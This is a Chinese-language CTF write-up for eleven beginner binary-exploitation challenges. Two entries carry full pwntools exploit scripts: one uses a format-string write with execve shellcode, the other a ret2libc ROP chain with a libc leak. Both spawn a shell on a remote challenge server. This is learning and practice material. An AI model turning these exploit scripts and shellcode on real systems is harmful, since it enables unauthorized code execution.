## pwn新手练习区
### 1. get_shell
题目：运行就能拿到shell呢，真的

思路：真的

### 2. CGfsb296
题目：菜鸡面对着pringf发愁，他不知道prinf除了输出还有什么作用

思路：利用格式化字符串漏洞利用方法读写任意地址

### 3. when_did_you_born12
题目：只要知道你的年龄就能获得flag，但菜鸡发现无论如何输入都不正确，怎么办

思路：简单的栈溢出，利用字符串变量覆盖另一个变量

### 4. hello_pwn
题目：pwn！，segment fault！菜鸡陷入了深思

思路：简单的栈溢出，利用字符串变量覆盖另一个变量

### 5. level0
题目：菜鸡了解了什么是溢出，他相信自己能得到shell

思路：简单的64位栈溢出

### 6. level2
题目：菜鸡请教大神如何获得flag，大神告诉他‘使用`面向返回的编程`(ROP)就可以了’

思路：简单的栈溢出，利用ROP获得shell

### 7. cgpwn2
题目：菜鸡认为自己需要一个字符串

思路：简单的栈溢出，首先利用一个固定地址的全局变量保存/bin/sh字符串，然后利用ROP获得shell

### 8. string
题目：菜鸡遇到了Dragon，有一位巫师可以帮助他逃离危险，但似乎需要一些要求

思路：简单的64位格式化字符串漏洞，先利用改漏洞修改一个堆上的变量，然后写入shellcode即可

解题：函数sub_400BB9存在格式化字符串漏洞，直接使用printf输出了format变量，这里首先确定可控制字符串format的偏移。有两种方法。

#### 偏移计算一：通过逆向和调试确定分析调用printf之前栈的分布

栈顶8个字节（没什么作用），往下8个字节的v2变量，再往下是format字符串。
```
rsp    --> 8字节垃圾
rsp+8  --> 8字节变量v2
rsp+16 --> format字符串
```

由于64位传参时，前6个参数使用寄存器，这里第一个参数是rdi，也就是format地址本身，后面5几个寄存器依次保存5个参数，栈顶8个字节是第6个参数，v2是第第7个参数，format是8个参数，因此偏移为8。

#### 偏移计算二：使用pwntools工具包自动计算
```python
context.bits = 64

def leak(payload):
    sh = remote('220.249.52.133', 59913)
    sh.recvuntil('be:\n')
    sh.sendline('1')
    sh.recvuntil('up?:\n')
    sh.sendline('east')
    sh.recvuntil('?:\n')
    sh.sendline('1')
    sh.recvuntil("'\n")
    sh.sendline('1')
    sh.recvuntil(':\n')
    sh.sendline(payload)
    info = sh.recvuntil('I hear')
    sh.close()
    return info

autofmt = FmtStr(leak)
print(autofmt.offset)
```

下面分析需求修改的变量，通过逆向分析，程序初始化了两个变量，一个为字符D，一个为字符U，如果这两个变量相等可以进入输入shellcode的逻辑，正常情况是不可能的，这里就利用字符串格式化漏洞实现。首先输入v2变量，内容为secret[0]的地址，然后format输入以下内容 %85c%7$n ,将第7个参数（v2）指向的内容写入85，也就是字符U。

后续输入shellcode可以使用pwntools，我这里是通过msf生成的。全部代码如下：
```python
def execute():
    sh = remote('220.249.52.133', 59913)
    info = sh.recvuntil('be:\n')
    info = str(info, encoding='utf8')
    addr = ''
    for line in info.split('\n'):
        if '[0]' in line:
            # 保存待修改变量地址
            addr = line.split(' ')[-1].strip()
            break
    print('secret addr:')
    print(addr)
    addr = int(addr, 16)

    sh.sendline('1')
    sh.recvuntil('up?:\n')
    sh.sendline('east')
    sh.recvuntil('?:\n')
    sh.sendline('1')
    sh.recvuntil("'\n")
    # 将待修改变量地址写入v2
    sh.sendline(str(addr).encode('utf8'))
    sh.recvuntil(':\n')
    
    # 利用这段payload修改变量
    payload = r'%85c%7$n'
    print(payload)
    sh.sendline(payload)
    print(sh.recvuntil('USE YOU SPELL'))

    # 写入shellcode
    shellcode = "\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00" + "\x53\x48\x89\xe7\x68\x2d\x63\x00\x00\x48\x89\xe6\x52\xe8" + "\x08\x00\x00\x00\x2f\x62\x69\x6e\x2f\x73\x68\x00\x56\x57" + "\x48\x89\xe6\x0f\x05"
    sh.sendline(shellcode)
    sh.interactive()
````

### 9. guess_num
题目：菜鸡在玩一个猜数字的游戏，但他无论如何都银不了，你能帮助他么

思路：简单的栈溢出，覆盖产生随机数的种子变量，然后爆破随机数序列即可


### 10. int_overflow
题目：菜鸡感觉这题似乎没有办法溢出，真的么?

思路：比较密码长度时将长度保存到了寄存器al中，当长度为259时，高字节被丢弃，al中为3，满足密码要求，同时259长度的密码在后面复制时存在简单栈溢出


### 11. level3
题目：libc!libc!这次没有system，你能帮菜鸡解决这个难题么?

思路：存在栈溢出，需要通过libc定位system函数

#### plt程序链接表，got全局偏移量表
plt表是一组代码片段，在动态库中引入的函数对应会在plt表中有一小段代码，用于跳转到got表所指向的真实库函数地址。但是在库函数第一次调用前，got表并不真的指向真实地址，而是指向plt表中的下一条指令，通过该指令可以修改got表指向真实的库函数地址，从而实现动态链接，提高程序启动效率。

#### system函数定位方法
由于elf程序并没有引入system函数，因此无法通过plt表调用system函数，system函数在libc中的地址是已知的，但是由于libc库加载时的基地址不知道，那么应该如何定位system函数呢？关键就是libc的基址，而libc中某一个函数在got中的值和libc库中的地址的差值就是libc的基址！一般而言程序总会引入libc库中的函数，如write，因此我们可以利用溢出泄露write函数在got中的值，然后计算基址，再进一步计算system函数的实际地址。

#### ROP攻击链
由于通过write函数泄露出libc基址只在本次程序运行有效，因此还需要让程序继续运行，但是由于system函数此时还没计算出来，因此这里最好的方法是重新跳转到main函数，得到system函数地址后再利用栈溢出调用system("/bin/sh")获得shell，这里字符串的地址可以通过```ROPgadget --binary libc_32.so.6 --string "/bin/sh"```获得（同样需要加上基址）。全部代码如下：
```python
from pwn import *

elf = ELF('level3')
libc = ELF('libc_32.so.6')

mainAddr = elf.sym['main']
print('[*] main: 0x%08x' % mainAddr)
writePlt = elf.plt['write']
print('[*] write plt: 0x%08x' % writePlt)
writeGot = elf.got['write']
print('[*] write got: 0x%08x' % writeGot)

p = remote('220.249.52.133', 31430)
p.recvuntil('\n')

payload = b''
payload += b'A' * 0x88
payload += b'A' * 4
# ret
payload += p32(writePlt)
# write ret
payload += p32(mainAddr)
# write(1, writeGot, 4)
payload += p32(1) + p32(writeGot) + p32(4)
p.sendline(payload)

writeGotValue = u32(p.recv())
print('[*] write: 0x%08x' % writeGotValue)

libBase = writeGotValue - libc.sym['write']
systemGotValue = libBase + libc.sym['system']
print('[*] system: 0x%08x' % systemGotValue)

p.recvuntil('\n')
payload = b''
payload += b'A' * 0x88
payload += b'A' * 4
# ret
payload += p32(systemGotValue)
# system ret
payload += b'AAAA'
# system("/bin/sh")
binshAddr = 0x0015902b + libBase
payload += p32(binshAddr)
p.sendline(payload)
p.interactive()
```

